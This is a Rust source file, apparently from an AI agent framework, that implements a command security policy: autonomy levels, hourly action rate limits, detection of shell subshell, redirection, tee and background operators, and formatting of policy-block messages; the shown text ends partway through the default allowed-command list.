use parking_lot::Mutex;
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use std::borrow::Cow;
use std::collections::BTreeSet;
use std::fmt;
use std::path::{Path, PathBuf};
use std::time::Instant;

/// How much autonomy the agent has
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "lowercase")]
pub enum AutonomyLevel {
    /// Read-only: can observe but not act
    ReadOnly,
    /// Supervised: acts but requires approval for risky operations
    #[default]
    Supervised,
    /// Full: autonomous execution within policy bounds
    Full,
}

impl std::str::FromStr for AutonomyLevel {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_ascii_lowercase().as_str() {
            "read_only" | "readonly" => Ok(Self::ReadOnly),
            "supervised" => Ok(Self::Supervised),
            "full" => Ok(Self::Full),
            _ => Err(format!(
                "invalid autonomy level '{s}': expected read_only, supervised, or full"
            )),
        }
    }
}

/// Risk score for shell command execution.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandRiskLevel {
    Low,
    Medium,
    High,
}

const MAX_COMMAND_FRAGMENT_CHARS: usize = 160;
const SECURITY_BLOCK_MESSAGE_PREFIX: &str = "blocked by security policy:";
const NO_COMMAND_FRAGMENT: &str = "<none>";
const READ_ONLY_POLICY_ID: &str = "autonomy.read_only";
const READ_ONLY_REASON: &str = "autonomy is read-only";
const MAX_ACTIONS_POLICY_ID: &str = "autonomy.max_actions_per_hour";
const RATE_LIMIT_PRECHECK_REASON: &str = "Rate limit exceeded: too many actions in the last hour";
const RATE_LIMIT_BUDGET_REASON: &str = "Rate limit exceeded: action budget exhausted";
const COMMAND_CONTEXT_RULES_POLICY_ID: &str = "autonomy.command_context_rules";
const ALLOW_UNSAFE_SHELL_STRUCTURES_CONFIG_KEY: &str = "autonomy.allow_unsafe_shell_structures";
const SHELL_STRUCTURE_SUBSHELL_POLICY_ID: &str = "autonomy.shell_structure.subshell";
const SHELL_STRUCTURE_REDIRECTION_POLICY_ID: &str = "autonomy.shell_structure.redirection";
const SHELL_STRUCTURE_TEE_POLICY_ID: &str = "autonomy.shell_structure.tee";
const SHELL_STRUCTURE_BACKGROUND_POLICY_ID: &str = "autonomy.shell_structure.background";

/// Structured metadata extracted from a formatted security policy block event.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct PolicyBlockEvent<'a> {
    pub policy_id: &'a str,
    pub command_fragment: &'a str,
    pub config_key: Option<&'a str>,
    pub reason: &'a str,
}

pub(crate) type CommandPolicyBlockEvent<'a> = PolicyBlockEvent<'a>;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum CommandPreviewStyle {
    Plain,
    MarkdownCode,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum CommandPreview {
    Empty,
    Wildcard,
    Listed { shown: Vec<String>, hidden: usize },
}

impl CommandPreview {
    pub(crate) fn render(
        &self,
        empty_message: &str,
        wildcard_message: &str,
        listed_suffix: Option<&str>,
    ) -> String {
        match self {
            Self::Empty => empty_message.to_string(),
            Self::Wildcard => wildcard_message.to_string(),
            Self::Listed { shown, hidden } => {
                let mut rendered = shown.join(", ");
                if *hidden > 0 {
                    rendered.push_str(&format!(" (+ {hidden} more)"));
                }
                if let Some(suffix) = listed_suffix.filter(|suffix| !suffix.is_empty()) {
                    if !rendered.is_empty() {
                        rendered.push(' ');
                    }
                    rendered.push_str(suffix);
                }
                rendered
            }
        }
    }
}

pub(crate) fn preview_command_entries(
    entries: &[String],
    max_display: usize,
    style: CommandPreviewStyle,
) -> CommandPreview {
    let normalized: BTreeSet<&str> = entries
        .iter()
        .map(|entry| entry.trim())
        .filter(|entry| !entry.is_empty())
        .collect();

    if normalized.contains("*") {
        return CommandPreview::Wildcard;
    }
    if normalized.is_empty() {
        return CommandPreview::Empty;
    }

    let shown = normalized
        .iter()
        .take(max_display)
        .map(|entry| match style {
            CommandPreviewStyle::Plain => (*entry).to_string(),
            CommandPreviewStyle::MarkdownCode => format!("`{entry}`"),
        })
        .collect();

    CommandPreview::Listed {
        shown,
        hidden: normalized.len().saturating_sub(max_display),
    }
}

impl<'a> PolicyBlockEvent<'a> {
    fn from_detail(detail: BlockEventDetail<'a>) -> Self {
        Self {
            policy_id: detail.policy_id,
            command_fragment: detail.command_fragment,
            config_key: detail.config_key,
            reason: detail.reason,
        }
    }

    pub(crate) fn config_key(&self) -> Option<&'a str> {
        self.config_key
            .or_else(|| policy_block_config_key(self.policy_id))
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PolicyBlockRecord {
    policy_id: String,
    command_fragment: String,
    config_key: Option<String>,
    reason: String,
}

impl PolicyBlockRecord {
    fn new(
        policy_id: impl Into<String>,
        reason: impl Into<String>,
        command: Option<&str>,
        config_key: Option<&str>,
    ) -> Self {
        let policy_id = policy_id.into();
        Self {
            config_key: config_key
                .filter(|value| !value.is_empty())
                .map(str::to_string)
                .or_else(|| policy_block_config_key(&policy_id).map(str::to_string)),
            policy_id,
            command_fragment: command_fragment(
                command
                    .map(str::trim)
                    .filter(|value| !value.is_empty())
                    .unwrap_or(NO_COMMAND_FRAGMENT),
            ),
            reason: reason.into(),
        }
    }

    fn event(&self) -> PolicyBlockEvent<'_> {
        PolicyBlockEvent {
            policy_id: &self.policy_id,
            command_fragment: &self.command_fragment,
            config_key: self.config_key.as_deref(),
            reason: &self.reason,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct PolicyBlockRenderReport {
    pub policy_id: Option<String>,
    pub command_preview: Option<String>,
    pub config_key: Option<String>,
    pub reason_preview: String,
    pub command_context: Option<String>,
    pub rule_index: Option<String>,
    pub segment_command: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PolicyBlockReasonFields {
    reason_preview: String,
    command_context: Option<String>,
    rule_index: Option<String>,
    segment_command: Option<String>,
}

impl PolicyBlockRenderReport {
    pub(crate) fn from_violation(
        violation: &CommandPolicyViolation,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> Self {
        Self::from_event(
            violation.record.event(),
            command_max_chars,
            reason_max_chars,
        )
    }

    pub(crate) fn from_block_event(
        policy_id: impl Into<String>,
        reason: impl Into<String>,
        command_fragment: Option<&str>,
        config_key: Option<&str>,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> Self {
        let reason = reason.into();
        Self::from_parts(
            Some(policy_id.into()),
            command_fragment.map(|command| truncate_chars(command, command_max_chars.max(16))),
            config_key
                .filter(|value| !value.is_empty())
                .map(str::to_string),
            PolicyBlockReasonFields::from_reason(&reason, command_max_chars, reason_max_chars),
        )
    }

    pub(crate) fn from_message(
        message: &str,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> Option<Self> {
        let event = parse_security_policy_block_event(message.trim())?;
        Some(Self::from_event(event, command_max_chars, reason_max_chars))
    }

    pub(crate) fn from_message_or_fallback(
        message: &str,
        fallback_policy_id: Option<&str>,
        fallback_command: Option<&str>,
        fallback_config_key: Option<&str>,
        default_reason: &str,
        default_reason_for_unstructured: bool,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> Option<Self> {
        let trimmed = message.trim();
        if trimmed.is_empty() {
            return None;
        }

        if let Some(report) = Self::from_message(trimmed, command_max_chars, reason_max_chars) {
            return Some(report.with_default_reason(default_reason));
        }

        Some(Self::from_fallback(
            trimmed,
            fallback_policy_id,
            fallback_command,
            fallback_config_key,
            default_reason,
            default_reason_for_unstructured,
            command_max_chars,
            reason_max_chars,
        ))
    }

    pub(crate) fn summary(&self) -> Option<String> {
        let mut summary = self.base_summary()?;
        if let Some(config_key) = self.normalized_config_key() {
            summary.push_str("; config_key=");
            summary.push_str(&config_key);
        }
        Some(summary)
    }

    pub(crate) fn constraint_summary(&self) -> Option<String> {
        self.summary()
            .map(|summary| format!("security blocked ({summary})"))
    }

    pub(crate) fn progress_detail(&self) -> Option<String> {
        self.summary().map(|summary| self.detail(summary))
    }

    fn summary_or_placeholder(&self) -> String {
        self.summary().unwrap_or_else(|| {
            let policy_id = self.policy_id.as_deref().unwrap_or("unknown");
            let command = self
                .command_preview
                .as_deref()
                .unwrap_or(NO_COMMAND_FRAGMENT);
            format!("policy={policy_id}; command={command}")
        })
    }

    pub(crate) fn append_detail_fields(&self, detail: &mut String) {
        let config_key = self.normalized_config_key();
        let fields = [
            ("policy", self.policy_id.as_deref()),
            ("command", self.command_preview.as_deref()),
            ("config_key", config_key.as_deref()),
            ("rule_index", self.rule_index.as_deref()),
            ("segment_command", self.segment_command.as_deref()),
            ("command_context", self.command_context.as_deref()),
        ];

        for (key, value) in fields {
            if let Some(value) = value {
                append_detail_field_if_missing(detail, key, value);
            }
        }
    }

    pub(crate) fn detail(&self, prefix: impl AsRef<str>) -> String {
        let mut detail = prefix.as_ref().trim().to_string();
        self.append_detail_fields(&mut detail);
        detail
    }

    pub(crate) fn format_block_message(&self) -> String {
        let mut detail = self.summary_or_placeholder();
        detail.push_str("; reason=");
        detail.push_str(&self.reason_preview);
        format!("{SECURITY_BLOCK_MESSAGE_PREFIX} {detail}")
    }

    pub(crate) fn append_command_context_guidance(
        &self,
        guidance: &mut String,
        max_context_chars: usize,
    ) {
        let Some(command_context) = self.command_context.as_deref() else {
            return;
        };
        let compact_context = truncate_chars(command_context, max_context_chars.max(16));
        if compact_context.is_empty() || guidance.contains("command_context=") {
            return;
        }

        if let Some((summary, guidance_suffix)) = guidance.split_once(" Guidance:") {
            *guidance =
                format!("{summary}; command_context={compact_context} Guidance:{guidance_suffix}");
        } else {
            guidance.push_str("; command_context=");
            guidance.push_str(&compact_context);
        }
    }

    pub(crate) fn constraint_guidance(&self, max_context_chars: usize) -> Option<String> {
        let mut guidance = self.constraint_summary()?
            + " Guidance: choose an allowed command/tool, or adjust the corresponding `[autonomy]` policy gate.";
        self.append_command_context_guidance(&mut guidance, max_context_chars);
        Some(guidance)
    }

    pub(crate) fn with_default_fields(
        mut self,
        default_policy_id: &str,
        default_command: &str,
        default_config_key: &str,
    ) -> Self {
        if self.policy_id.as_deref().is_none_or(str::is_empty) {
            self.policy_id = Some(default_policy_id.to_string());
        }
        if self.command_preview.as_deref().is_none_or(str::is_empty) {
            self.command_preview = Some(default_command.to_string());
        }
        self.config_key = Self::resolve_config_key(
            self.policy_id.as_deref(),
            self.config_key.as_deref(),
            Some(default_config_key),
        );
        self
    }

    fn normalized_config_key(&self) -> Option<String> {
        Self::resolve_config_key(self.policy_id.as_deref(), self.config_key.as_deref(), None)
    }

    pub(crate) fn policy_id(&self) -> Option<&str> {
        self.policy_id.as_deref()
    }

    pub(crate) fn command_preview(&self) -> Option<&str> {
        self.command_preview.as_deref()
    }

    pub(crate) fn config_key(&self) -> Option<&str> {
        self.config_key
            .as_deref()
            .or_else(|| policy_block_config_key(self.policy_id.as_deref()?))
    }

    pub(crate) fn command_context(&self) -> Option<&str> {
        self.command_context.as_deref()
    }

    pub(crate) fn append_runtime_trace_metadata(&self, metadata: &mut serde_json::Value) {
        let Some(metadata) = metadata.as_object_mut() else {
            return;
        };

        metadata.insert(
            "blocked_policy_id".to_string(),
            self.policy_id()
                .map(|value| serde_json::Value::String(value.to_string()))
                .unwrap_or(serde_json::Value::Null),
        );
        metadata.insert(
            "blocked_command".to_string(),
            self.command_preview()
                .map(|value| serde_json::Value::String(value.to_string()))
                .unwrap_or(serde_json::Value::Null),
        );
        metadata.insert(
            "blocked_config_key".to_string(),
            self.config_key()
                .map(|value| serde_json::Value::String(value.to_string()))
                .unwrap_or(serde_json::Value::Null),
        );
        metadata.insert(
            "blocked_command_context".to_string(),
            self.command_context()
                .map(str::to_string)
                .map(serde_json::Value::String)
                .unwrap_or(serde_json::Value::Null),
        );
    }

    fn from_event(
        event: PolicyBlockEvent<'_>,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> Self {
        Self::from_parts(
            Some(event.policy_id.to_string()),
            Some(truncate_chars(
                event.command_fragment,
                command_max_chars.max(16),
            )),
            event.config_key.map(str::to_string),
            PolicyBlockReasonFields::from_reason(event.reason, command_max_chars, reason_max_chars),
        )
    }

    fn from_fallback(
        message: &str,
        fallback_policy_id: Option<&str>,
        fallback_command: Option<&str>,
        fallback_config_key: Option<&str>,
        default_reason: &str,
        default_reason_for_unstructured: bool,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> Self {
        Self::from_parts(
            fallback_policy_id.map(str::to_string),
            fallback_command.map(|command| truncate_chars(command, command_max_chars.max(16))),
            fallback_config_key.map(str::to_string),
            PolicyBlockReasonFields::from_fallback_message(
                message,
                default_reason,
                default_reason_for_unstructured,
                reason_max_chars,
            ),
        )
    }

    fn from_parts(
        policy_id: Option<String>,
        command_preview: Option<String>,
        config_key: Option<String>,
        reason_fields: PolicyBlockReasonFields,
    ) -> Self {
        let resolved_config_key =
            Self::resolve_config_key(policy_id.as_deref(), config_key.as_deref(), None);
        Self {
            policy_id,
            command_preview,
            config_key: resolved_config_key,
            reason_preview: reason_fields.reason_preview,
            command_context: reason_fields.command_context,
            rule_index: reason_fields.rule_index,
            segment_command: reason_fields.segment_command,
        }
    }

    fn base_summary(&self) -> Option<String> {
        Some(format!(
            "policy={}; command={}",
            self.policy_id.as_deref()?,
            self.command_preview.as_deref()?
        ))
    }

    fn resolve_config_key(
        policy_id: Option<&str>,
        config_key: Option<&str>,
        default_config_key: Option<&str>,
    ) -> Option<String> {
        config_key
            .filter(|value| !value.is_empty())
            .map(str::to_string)
            .or_else(|| {
                policy_id
                    .filter(|value| !value.is_empty())
                    .and_then(policy_block_config_key)
                    .map(str::to_string)
            })
            .or_else(|| {
                default_config_key
                    .filter(|value| !value.is_empty())
                    .map(str::to_string)
            })
    }

    fn with_default_reason(mut self, default_reason: &str) -> Self {
        if self.reason_preview.trim().is_empty() && !default_reason.trim().is_empty() {
            self.reason_preview = default_reason.to_string();
        }
        self
    }
}

impl From<&PolicyBlockRecord> for PolicyBlockRenderReport {
    fn from(record: &PolicyBlockRecord) -> Self {
        Self {
            policy_id: Some(record.policy_id.clone()),
            command_preview: Some(record.command_fragment.clone()),
            config_key: record.config_key.clone(),
            reason_preview: record.reason.clone(),
            command_context: None,
            rule_index: None,
            segment_command: None,
        }
    }
}

impl PolicyBlockReasonFields {
    fn plain(reason_preview: String) -> Self {
        Self {
            reason_preview,
            command_context: None,
            rule_index: None,
            segment_command: None,
        }
    }

    fn from_reason(reason: &str, command_max_chars: usize, reason_max_chars: usize) -> Self {
        Self {
            reason_preview: truncate_chars(reason, reason_max_chars.max(16)),
            command_context: extract_policy_field(reason, "command_context").map(str::to_string),
            rule_index: extract_policy_field(reason, "rule_index").map(str::to_string),
            segment_command: extract_policy_field(reason, "segment_command")
                .map(|value| truncate_chars(value, command_max_chars.max(16))),
        }
    }

    fn from_fallback_message(
        message: &str,
        default_reason: &str,
        default_reason_for_unstructured: bool,
        reason_max_chars: usize,
    ) -> Self {
        let raw_reason = truncate_chars(
            strip_tool_error_prefix(message.trim()),
            reason_max_chars.max(16),
        );
        let reason_preview = if default_reason_for_unstructured && !default_reason.trim().is_empty()
        {
            default_reason.to_string()
        } else if raw_reason.is_empty() {
            default_reason.to_string()
        } else {
            raw_reason
        };

        Self::plain(reason_preview)
    }
}

fn append_detail_field_if_missing(detail: &mut String, key: &str, value: &str) {
    let expected = format!("{key}={value}");
    if detail.contains(&expected) {
        return;
    }

    let separator = if detail.contains(&format!("{key}=")) {
        "; "
    } else if detail.contains(' ') {
        " "
    } else {
        "; "
    };
    detail.push_str(separator);
    detail.push_str(expected.as_str());
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct ShellStructureBlock {
    policy_id: &'static str,
    reason: &'static str,
}

fn is_shell_structure_policy_id(policy_id: &str) -> bool {
    matches!(
        policy_id,
        SHELL_STRUCTURE_SUBSHELL_POLICY_ID
            | SHELL_STRUCTURE_REDIRECTION_POLICY_ID
            | SHELL_STRUCTURE_TEE_POLICY_ID
            | SHELL_STRUCTURE_BACKGROUND_POLICY_ID
    )
}

fn detect_shell_structure_block(command: &str) -> Option<ShellStructureBlock> {
    if command.contains('`')
        || contains_unquoted_shell_variable_expansion(command)
        || command.contains("<(")
        || command.contains(">(")
    {
        return Some(ShellStructureBlock {
            policy_id: SHELL_STRUCTURE_SUBSHELL_POLICY_ID,
            reason:
                "Shell subshell/expansion operators (`...`, `$()`, `${}`, `<(`, `>(`) are blocked by security policy",
        });
    }

    // Ignore quoted literals, e.g. `echo \"a>b\"` and `echo \"a<b\"`.
    if contains_unquoted_char(command, '>') || contains_unquoted_char(command, '<') {
        return Some(ShellStructureBlock {
            policy_id: SHELL_STRUCTURE_REDIRECTION_POLICY_ID,
            reason: "Shell redirection operators (`<`, `>`, `>>`) are blocked by security policy",
        });
    }

    if command
        .split_whitespace()
        .any(|w| w == "tee" || w.ends_with("/tee"))
    {
        return Some(ShellStructureBlock {
            policy_id: SHELL_STRUCTURE_TEE_POLICY_ID,
            reason: "The `tee` command is blocked by security policy",
        });
    }

    // Keep `&&` allowed; only block unquoted single ampersand operator.
    if contains_unquoted_single_ampersand(command) {
        return Some(ShellStructureBlock {
            policy_id: SHELL_STRUCTURE_BACKGROUND_POLICY_ID,
            reason: "Single `&` background chaining is blocked by security policy",
        });
    }

    None
}

fn shell_structure_violation(command: &str) -> Option<CommandPolicyViolation> {
    detect_shell_structure_block(command).map(|block| {
        CommandPolicyViolation::new(
            block.policy_id,
            format!(
                "Command not allowed by security policy: {}. Set `[autonomy].allow_unsafe_shell_structures = true` to opt in.",
                block.reason
            ),
            command,
        )
    })
}

/// Structured reason for a command blocked by security policy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandPolicyViolation {
    record: PolicyBlockRecord,
}

impl CommandPolicyViolation {
    pub fn new(policy_id: &'static str, reason: impl Into<String>, command: &str) -> Self {
        Self {
            record: PolicyBlockRecord::new(policy_id, reason, Some(command), None),
        }
    }

    pub fn from_block_event(
        policy_id: &'static str,
        reason: impl Into<String>,
        command: Option<&str>,
    ) -> Self {
        Self {
            record: PolicyBlockRecord::new(policy_id, reason, command, None),
        }
    }

    pub fn policy_id(&self) -> &str {
        &self.record.policy_id
    }

    pub fn command_fragment(&self) -> &str {
        &self.record.command_fragment
    }

    pub fn config_key(&self) -> Option<&str> {
        self.record.config_key.as_deref()
    }

    pub(crate) fn render_report(&self) -> PolicyBlockRenderReport {
        PolicyBlockRenderReport::from(&self.record)
    }

    pub(crate) fn render_report_with_limits(
        &self,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> PolicyBlockRenderReport {
        PolicyBlockRenderReport::from_violation(self, command_max_chars, reason_max_chars)
    }

    pub(crate) fn render_execution_report_with_limits(
        &self,
        command_max_chars: usize,
        reason_max_chars: usize,
    ) -> PolicyBlockRenderReport {
        let mut report = self.render_report_with_limits(command_max_chars, reason_max_chars);
        if self.policy_id() == "autonomy.allowed_commands"
            && !report
                .reason_preview
                .to_ascii_lowercase()
                .contains("command not allowed by security policy")
        {
            report.reason_preview = format!(
                "Command not allowed by security policy: {}",
                report.reason_preview
            );
        }
        report
    }

    pub fn format_block_message(&self) -> String {
        self.render_report().format_block_message()
    }
}

impl fmt::Display for CommandPolicyViolation {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.format_block_message())
    }
}

impl std::error::Error for CommandPolicyViolation {}

pub fn format_policy_block_event(
    policy_id: &'static str,
    reason: impl Into<String>,
    command: Option<&str>,
) -> String {
    CommandPolicyViolation::from_block_event(policy_id, reason, command).format_block_message()
}

pub(crate) fn read_only_policy_block_event(command: Option<&str>) -> String {
    format_policy_block_event(READ_ONLY_POLICY_ID, READ_ONLY_REASON, command)
}

pub(crate) fn rate_limit_precheck_policy_block_event(command: Option<&str>) -> String {
    format_policy_block_event(MAX_ACTIONS_POLICY_ID, RATE_LIMIT_PRECHECK_REASON, command)
}

pub(crate) fn action_budget_exhausted_policy_block_event(command: Option<&str>) -> String {
    format_policy_block_event(MAX_ACTIONS_POLICY_ID, RATE_LIMIT_BUDGET_REASON, command)
}

fn tool_operation_policy_block_event(
    policy_id: &'static str,
    reason: &'static str,
    operation_name: &str,
) -> String {
    format_policy_block_event(policy_id, reason, Some(operation_name))
}

fn action_policy_block(
    blocked: bool,
    policy_id: &'static str,
    reason: &'static str,
    action_subject: &str,
) -> Option<CommandPolicyViolation> {
    blocked
        .then(|| CommandPolicyViolation::from_block_event(policy_id, reason, Some(action_subject)))
}

#[derive(Clone, Copy)]
enum ActionPreflightStage<'a> {
    ActionState,
    CommandPolicy { command: &'a str, approved: bool },
    ActionBudget,
}

impl<'a> ActionPreflightStage<'a> {
    fn evaluate(
        self,
        security: &SecurityPolicy,
        action_subject: &str,
    ) -> Option<CommandPolicyViolation> {
        match self {
            Self::ActionState => action_precheck_violation(security, action_subject),
            Self::CommandPolicy { command, approved } => {
                command_policy_precheck_violation(security, command, approved)
            }
            Self::ActionBudget => action_budget_violation(security, action_subject),
        }
    }
}

pub(crate) fn action_precheck_violation(
    security: &SecurityPolicy,
    action_subject: &str,
) -> Option<CommandPolicyViolation> {
    action_policy_block(
        !security.can_act(),
        READ_ONLY_POLICY_ID,
        READ_ONLY_REASON,
        action_subject,
    )
    .or_else(|| {
        action_policy_block(
            security.is_rate_limited(),
            MAX_ACTIONS_POLICY_ID,
            RATE_LIMIT_PRECHECK_REASON,
            action_subject,
        )
    })
}

pub(crate) fn action_budget_violation(
    security: &SecurityPolicy,
    action_subject: &str,
) -> Option<CommandPolicyViolation> {
    action_policy_block(
        !security.record_action(),
        MAX_ACTIONS_POLICY_ID,
        RATE_LIMIT_BUDGET_REASON,
        action_subject,
    )
}

pub(crate) fn action_command_preflight_violation(
    security: &SecurityPolicy,
    action_subject: &str,
    command_validation: Option<(&str, bool)>,
) -> Option<CommandPolicyViolation> {
    let subject = command_validation_subject(action_subject, command_validation);
    [
        Some(ActionPreflightStage::ActionState),
        command_validation
            .map(|(command, approved)| ActionPreflightStage::CommandPolicy { command, approved }),
        Some(ActionPreflightStage::ActionBudget),
    ]
    .into_iter()
    .flatten()
    .find_map(|stage| stage.evaluate(security, subject))
}

pub(crate) fn action_command_preflight_with_approval_violation(
    security: &SecurityPolicy,
    action_subject: &str,
    command: Option<&str>,
    approved: bool,
) -> Option<CommandPolicyViolation> {
    action_command_preflight_violation(
        security,
        action_subject,
        command.map(|value| (value, approved)),
    )
}

fn command_validation_subject<'a>(
    action_subject: &'a str,
    command_validation: Option<(&'a str, bool)>,
) -> &'a str {
    command_validation
        .map(|(command, _)| command.trim())
        .filter(|command| !command.is_empty())
        .unwrap_or(action_subject)
}

pub(crate) fn command_policy_precheck_violation(
    security: &SecurityPolicy,
    command: &str,
    approved: bool,
) -> Option<CommandPolicyViolation> {
    security
        .validate_command_execution_with_reason(command, approved)
        .err()
}

pub(crate) fn is_command_policy_block_message(message: &str) -> bool {
    strip_security_block_prefix(message).is_some()
}

pub(crate) fn parse_security_policy_block_event(message: &str) -> Option<PolicyBlockEvent<'_>> {
    let detail = strip_security_block_prefix(message)?;
    parse_block_event_detail(detail).map(PolicyBlockEvent::from_detail)
}

pub(crate) fn parse_command_policy_block_event(
    message: &str,
) -> Option<CommandPolicyBlockEvent<'_>> {
    parse_security_policy_block_event(message)
}

pub(crate) fn policy_block_config_key(policy_id: &str) -> Option<&str> {
    if is_shell_structure_policy_id(policy_id) {
        return Some(ALLOW_UNSAFE_SHELL_STRUCTURES_CONFIG_KEY);
    }

    let mapped = match policy_id {
        COMMAND_CONTEXT_RULES_POLICY_ID => COMMAND_CONTEXT_RULES_POLICY_ID,
        "runtime.channel.excluded_tools" => "autonomy.non_cli_excluded_tools",
        "runtime.approval.user_decision"
        | "runtime.approval.pending_request_not_found"
        | "runtime.approval.pending_request_cancelled"
        | "runtime.approval.pending_request_timeout"
        | "runtime.approval.non_cli_context_required" => "autonomy.auto_approve",
        "autonomy.workspace_path_guard" => "autonomy.allowed_roots",
        _ => policy_id,
    };

    if mapped.starts_with("autonomy.") {
        Some(mapped)
    } else {
        None
    }
}

pub(crate) fn summarize_command_policy_block(
    message: &str,
    max_command_chars: usize,
) -> Option<String> {
    if let Some(summary) = PolicyBlockRenderReport::from_message(message, max_command_chars, 16)
        .and_then(|report| report.summary())
    {
        return Some(summary);
    }

    let detail = strip_security_block_prefix(message)?;
    Some(truncate_chars(
        detail,
        max_command_chars.saturating_add(40).max(40),
    ))
}

pub(crate) fn render_command_policy_block_summary(
    message: &str,
    max_command_chars: usize,
) -> Option<String> {
    summarize_command_policy_block(message, max_command_chars)
        .map(|summary| format!("security blocked ({summary})"))
}

pub(crate) fn render_command_policy_block_guidance(
    message: &str,
    max_command_chars: usize,
    max_reason_chars: usize,
    max_context_chars: usize,
) -> Option<String> {
    let trimmed = message.trim();
    if trimmed.is_empty() {
        return None;
    }

    if let Some(report) =
        PolicyBlockRenderReport::from_message(trimmed, max_command_chars, max_reason_chars)
    {
        return report.constraint_guidance(max_context_chars);
    }

    render_command_policy_block_summary(trimmed, max_command_chars).map(|summary| {
        summary
            + " Guidance: choose an allowed command/tool, or adjust the corresponding `[autonomy]` policy gate."
    })
}

fn extract_policy_field<'a>(reason: &'a str, key: &str) -> Option<&'a str> {
    reason
        .split(';')
        .map(str::trim)
        .filter_map(|segment| segment.split_once('='))
        .find_map(|(segment_key, segment_value)| {
            if segment_key.trim() != key {
                return None;
            }
            let value = segment_value.trim();
            if value.is_empty() {
                return None;
            }
            Some(value)
        })
}

fn strip_tool_error_prefix(message: &str) -> &str {
    message
        .strip_prefix("Error:")
        .map(str::trim)
        .unwrap_or(message)
}

fn strip_security_block_prefix(message: &str) -> Option<&str> {
    let trimmed = strip_tool_error_prefix(message.trim());
    if trimmed.len() < SECURITY_BLOCK_MESSAGE_PREFIX.len() {
        return None;
    }
    let (prefix, rest) = trimmed.split_at(SECURITY_BLOCK_MESSAGE_PREFIX.len());
    if !prefix.eq_ignore_ascii_case(SECURITY_BLOCK_MESSAGE_PREFIX) {
        return None;
    }
    Some(rest.trim())
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct BlockEventDetail<'a> {
    policy_id: &'a str,
    command_fragment: &'a str,
    config_key: Option<&'a str>,
    reason: &'a str,
}

fn parse_block_event_detail(detail: &str) -> Option<BlockEventDetail<'_>> {
    let detail = detail.strip_prefix("policy=")?;
    let (policy_id, rest) = detail.split_once("; command=")?;
    let (command_fragment, config_key, reason) =
        if let Some((command_fragment, rest)) = rest.split_once("; config_key=") {
            let (config_key, reason) = rest.split_once("; reason=").unwrap_or((rest, ""));
            (command_fragment, Some(config_key), reason)
        } else if let Some((command_fragment, reason)) = rest.split_once("; reason=") {
            (command_fragment, None, reason)
        } else {
            (rest, None, "")
        };
    let policy_id = policy_id.trim();
    let command_fragment = command_fragment.trim();
    let config_key = config_key.map(str::trim).filter(|value| !value.is_empty());
    if policy_id.is_empty() || command_fragment.is_empty() {
        return None;
    }

    Some(BlockEventDetail {
        policy_id,
        command_fragment,
        config_key,
        reason: reason.trim(),
    })
}

fn truncate_chars(value: &str, max_chars: usize) -> String {
    let total_chars = value.chars().count();
    if total_chars <= max_chars {
        return value.to_string();
    }

    let truncated: String = value.chars().take(max_chars).collect();
    format!("{truncated}...")
}

fn command_fragment(command: &str) -> String {
    let compact = command.split_whitespace().collect::<Vec<_>>().join(" ");
    if compact.is_empty() {
        return "<empty>".to_string();
    }
    truncate_chars(&compact, MAX_COMMAND_FRAGMENT_CHARS)
}

/// Classifies whether a tool operation is read-only or side-effecting.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ToolOperation {
    Read,
    Act,
}

/// Sliding-window action tracker for rate limiting.
#[derive(Debug)]
pub struct ActionTracker {
    /// Timestamps of recent actions (kept within the last hour).
    actions: Mutex<Vec<Instant>>,
}

impl ActionTracker {
    pub fn new() -> Self {
        Self {
            actions: Mutex::new(Vec::new()),
        }
    }

    /// Record an action and return the current count within the window.
    pub fn record(&self) -> usize {
        let mut actions = self.actions.lock();
        let cutoff = Instant::now()
            .checked_sub(std::time::Duration::from_secs(3600))
            .unwrap_or_else(Instant::now);
        actions.retain(|t| *t > cutoff);
        actions.push(Instant::now());
        actions.len()
    }

    /// Count of actions in the current window without recording.
    pub fn count(&self) -> usize {
        let mut actions = self.actions.lock();
        let cutoff = Instant::now()
            .checked_sub(std::time::Duration::from_secs(3600))
            .unwrap_or_else(Instant::now);
        actions.retain(|t| *t > cutoff);
        actions.len()
    }
}

impl Clone for ActionTracker {
    fn clone(&self) -> Self {
        let actions = self.actions.lock();
        Self {
            actions: Mutex::new(actions.clone()),
        }
    }
}

/// Security policy enforced on all tool executions
#[derive(Debug, Clone)]
pub struct SecurityPolicy {
    pub autonomy: AutonomyLevel,
    pub workspace_dir: PathBuf,
    pub workspace_only: bool,
    pub allowed_commands: Vec<String>,
    pub unrestricted_commands: Vec<String>,
    pub command_context_rules: Vec<crate::config::CommandContextRuleConfig>,
    pub forbidden_paths: Vec<String>,
    pub allowed_roots: Vec<PathBuf>,
    pub max_actions_per_hour: u32,
    pub max_cost_per_day_cents: u32,
    pub require_approval_for_medium_risk: bool,
    pub block_high_risk_commands: bool,
    pub allow_unsafe_shell_structures: bool,
    pub shell_env_passthrough: Vec<String>,
    pub allow_sensitive_file_reads: bool,
    pub allow_sensitive_file_writes: bool,
    pub tracker: ActionTracker,
}

impl Default for SecurityPolicy {
    fn default() -> Self {
        Self {
            autonomy: AutonomyLevel::Supervised,
            workspace_dir: PathBuf::from("."),
            workspace_only: true,
            allowed_commands: vec![
                "git".into(),
                "npm".into(),
                "cargo".into(),
                "mkdir".into(),
                "touch".into(),
                "cp".into(),
